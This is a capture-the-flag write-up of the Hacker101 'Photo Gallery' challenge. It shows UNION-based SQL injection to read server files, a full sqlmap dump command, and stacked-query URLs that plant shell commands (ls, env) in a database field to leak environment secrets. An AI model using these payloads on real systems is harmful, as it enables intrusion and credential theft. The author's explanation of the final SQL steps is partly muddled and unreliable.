# Hacker101 CTF - Photo Gallery

- CTF Name: Photo Gallery
- Resource: Hacker101 CTF
- Difficulty: Moderate
- Number of Flags: 3

Note::: NO, I won't be posting my found FLAGS, but I will be posting the methods I used. 

<hr>


### Flag0
- Hint: 
 1. Consider how you might build this system yourself. What would the query for fetch look like?
 2. Take a few minutes to consider the state of the union
 3. This application runs on the uwsgi-nginx-flask-docker image
- Acquired By:
 1. First thing I want to do is look at the code and see if anything pops out. Sadly, there are no obvious hints but the link to the pictures looks... odd. It is code that is calling on an id number for each picture. `<img src="fetch?id=2" width="266" height="150">` With these types of inputs I want to try and see what else is there. For this I used ZAP to throw in numbers 1-100. ![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/4pdksqbsvvqzgz0rzmlt.png) This sadly didn't produce anything new. But this gave me the idea to try and attack the database from this input point.
 2. For testing the database I need to use some sql. Because the hint mentions something about "the state of the union" I bet it has to do with a union statement so let's try some. For this I will use sqlmap. I am still getting sqlmap so for those that don't know "sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers." (1) Now, because of the third hint I know that I need to be looking for a config file for the uwsgi-nginx-flask-docker image. After some research I find that this is usually a "uqsgi.ini" file so I built a union statement to find this with `fetch?id=4 UNION SELECT 'uwsgi.ini'--` This revealed that there was a "[uwsgi] module = main callable = app " statement that I got back from the server. This tells me that there is a main file so I not want to get that file.
 3. To get the main file I use the same basic union statement and change the uwsgi.ini to main.py. This revealed an odd file about a Magical Image Gallery that had the flag in it. ![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/p6vpusdogzpvlkyt5la8.png)
 

### Flag1/Flag2
- Hint: 
 1. I never trust a kitten I can't see
 2. Or a query whose results I can't see, for that matter
- Acquired By: 
 1. First thing I did was look at the site I was just on for the first flag. This page has a lot of information in it about the querys being used for the MySQLdb. `MySQLdb.connect(host="localhost", user="root", password="", db="level5")`, `cur.execute('SELECT id, title FROM albums')`, and `cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, ))`. This tells me that there is 2 columns called in the albums table, 3 columns in the photos table, and a database called "level5".
 2. As the hint is around a kitten that can't be trusted I bet there is another album or photo to look for. For this I want to use SQLMap cause it is a good tool to sql things. =p This took me a lot of work to really understand. Admittedly, I used another walkthrough but it didn't work the first 10 times so I had to figure it out. What worked for me was this call to sqlmap `python sqlmap.py -u "http://35.227.24.107/d7f2b886cc/fetch?id=1" --method=GET --dump -D level5 -T photos -p id --code=200 --ignore-code=500 --skip-waf --threads=2 -o`(see below for a break down of this statement) This produced a lot of information about its testing but also this lovely output. ![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/ioc0ijxak0yqvglxab3z.png) That id 3 looks... odd. Lucky, SQLMap offered to decode it for me and I got ![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/y9w3ndmsrwmrjqbpq6te.png) ohhh a new file. It looks like it is giving me a hint but I am not quite sure how to get it. I did use someone else's walkthrough and yet again it didn't work for me. Half a day later I got this to work.

Here are the steps I used (see what I learned from this below)
>3. I did try to use the previous UNION statement to view the tmp file but nothing shows up yet. Time to Google again. This I also something that I needed help with. I found the following set of code to be useful...
1. use `http://(domain)/(yourID)/fetch?id=1;%20update%20photos%20set%20filename=%27*%20||%20ls%20./files%20%3Etemp.txt%20%27%20where%20id=3;%20commit;%20--`
2. refresh the home page
3. now use `http://(domain)/(yourID)/fetch?id=1;%20update%20photos%20set%20filename=%27*%20||%20env%20%3Etemp.txt%27%20where%20id=3;%20commit;%20--`
4. refresh home
5. use the UNION statement with 'temp.txt` and poof. allllll the flags are found. ![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/5mcm7no97oqokdvzmw21.png) 



### Flag2
- Hint: 
 1. That method of finding the size of an album seems suspicious
 2. Stacked queries rarely work. But when they do, make absolutely sure that you're committed
 3. Be aware of your environment
- Acquired By: 
See previous flag as it was already found
sneaky sneaky
![](https://media.giphy.com/media/9uuG5Vd76Zcek/giphy.gif)

### Learned
SQLMap. The statement that I used was:
 `python sqlmap.py -u "http://35.227.24.107/d7f2b886cc/fetch?id=1" --method=GET --dump -D level5 -T photos -p id --code=200 --ignore-code=500 --skip-waf --threads=2 -o` It breaks down into this....
`python sqlmap.py` - start sqlmap
`-u` - url input to follow
"http://(domain)/(uniquiID)/fetch?id=1" -  the url to attack
`--method=GET` - Will run with a GET HTTP header
`--dump` - Will dump the output into a directory at the end
`-D level5` - The name of the Database to attack
`-T photos` - The name of the Table in the database to attack
`-p id` - The Parameter to attack
`--code=200 --ignore-code=500` - This is looking for status codes to accept and ignore
`--skip-waf` - To skip heuristic detection of WAF/IPS protection
`--threads=2` - Max number of concurrent HTTP(s) requests (default 1)
`-o` - Turn on all optimization switches

SQL Statements:
The series of statements is renaming files. The first one renames the image file to the tmp file so that when it loads you will be able to see a list of other files. 
Then the image is renamed again so that now when it loads the contents of the 'requirements.txt' files is loaded with the flags.



<hr>

Happy Hacking
![](https://media.giphy.com/media/l3vRmVv5P01I5NDAA/giphy.gif)

### Resources
1. https://tools.kali.org/vulnerability-analysis/sqlmap
2. https://uwsgi-docs.readthedocs.io/en/latest/Configuration.html#ini-files



###### Please Note: that I am still learning and if something that I have stated is incorrect please let me know. I would love to learn more about what I may not understand fully.
